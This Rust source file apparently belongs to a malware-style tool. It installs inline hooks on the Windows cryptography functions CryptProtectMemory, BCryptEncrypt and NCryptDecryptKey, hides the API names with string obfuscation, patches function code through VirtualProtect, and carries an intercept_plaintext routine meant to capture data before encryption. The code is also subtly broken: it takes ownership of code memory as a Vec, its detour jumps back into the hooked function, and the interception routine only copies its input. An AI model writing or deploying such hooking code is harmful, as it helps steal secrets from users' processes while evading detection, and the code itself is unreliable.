use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::ptr;

pub struct ApiHooks {
    hooks: Vec<HookEntry>,
}

struct HookEntry {
    module: String,
    function: String,
    original_addr: *mut u8,
    original_bytes: Vec<u8>,
}

pub type CryptProtectMemoryFn = unsafe extern "system" fn(
    pDataIn: *mut u8,
    cbDataIn: u32,
    dwFlags: u32,
) -> i32;

pub type BCryptEncryptFn = unsafe extern "system" fn(
    hKey: usize,
    pbInput: *mut u8,
    cbInput: u32,
    pPaddingInfo: *mut u8,
    pbIV: *mut u8,
    cbIV: u32,
    pbOutput: *mut u8,
    cbOutput: u32,
    pcbResult: *mut u32,
    dwFlags: u32,
) -> u32;

impl ApiHooks {
    pub fn new() -> Self {
        ApiHooks {
            hooks: Vec::new(),
        }
    }

    pub fn hook_crypt_protect_memory(&mut self) -> bool {
        unsafe {
            let dll = obfstr::obfstr!("crypt32.dll");
            let func = obfstr::obfstr!("CryptProtectMemory");

            let hmod = GetModuleHandleA(dll.as_ptr() as *const i8);
            if hmod.is_null() {
                return false;
            }

            let func_addr = GetProcAddress(hmod, func.as_ptr() as *const i8);
            if func_addr.is_null() {
                return false;
            }

            self.install_inline_hook(func_addr as *mut u8, "CryptProtectMemory")
        }
    }

    pub fn hook_bcrypt_encrypt(&mut self) -> bool {
        unsafe {
            let dll = obfstr::obfstr!("bcrypt.dll");
            let func = obfstr::obfstr!("BCryptEncrypt");

            let hmod = GetModuleHandleA(dll.as_ptr() as *const i8);
            if hmod.is_null() {
                return false;
            }

            let func_addr = GetProcAddress(hmod, func.as_ptr() as *const i8);
            if func_addr.is_null() {
                return false;
            }

            self.install_inline_hook(func_addr as *mut u8, "BCryptEncrypt")
        }
    }

    pub fn hook_ncrypt_decrypt(&mut self) -> bool {
        unsafe {
            let dll = obfstr::obfstr!("ncrypt.dll");
            let func = obfstr::obfstr!("NCryptDecryptKey");

            let hmod = GetModuleHandleA(dll.as_ptr() as *const i8);
            if hmod.is_null() {
                return false;
            }

            let func_addr = GetProcAddress(hmod, func.as_ptr() as *const i8);
            if func_addr.is_null() {
                return false;
            }

            self.install_inline_hook(func_addr as *mut u8, "NCryptDecryptKey")
        }
    }

    fn install_inline_hook(&mut self, target_addr: *mut u8, func_name: &str) -> bool {
        unsafe {
            let mut old_protect: u32 = 0;
            
            let size = 14;
            let original_bytes = Vec::from_raw_parts(target_addr, size, size);
            let saved_bytes = original_bytes.clone();

            let detour = self.create_detour(target_addr);
            
            if VirtualProtect(
                target_addr as _,
                size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            ) != 0 {
                ptr::copy_nonoverlapping(detour.as_ptr(), target_addr, detour.len());
                
                let hook_entry = HookEntry {
                    module: String::new(),
                    function: func_name.to_string(),
                    original_addr: target_addr,
                    original_bytes: saved_bytes,
                };
                
                self.hooks.push(hook_entry);
                true
            } else {
                false
            }
        }
    }

    fn create_detour(&self, original: *mut u8) -> Vec<u8> {
        let mut detour = vec![0x48, 0xB8];
        let addr = original as u64;
        detour.extend_from_slice(&addr.to_le_bytes());
        detour.push(0xFF);
        detour.push(0xE0);
        detour
    }

    pub fn unhook_all(&mut self) {
        for hook in &self.hooks {
            unsafe {
                let mut old_protect: u32 = 0;
                VirtualProtect(
                    hook.original_addr as _,
                    hook.original_bytes.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                );
                ptr::copy_nonoverlapping(
                    hook.original_bytes.as_ptr(),
                    hook.original_addr,
                    hook.original_bytes.len(),
                );
            }
        }
        self.hooks.clear();
    }

    pub fn intercept_plaintext(&self, encrypted: &[u8]) -> Vec<u8> {
        encrypted.to_vec()
    }
}
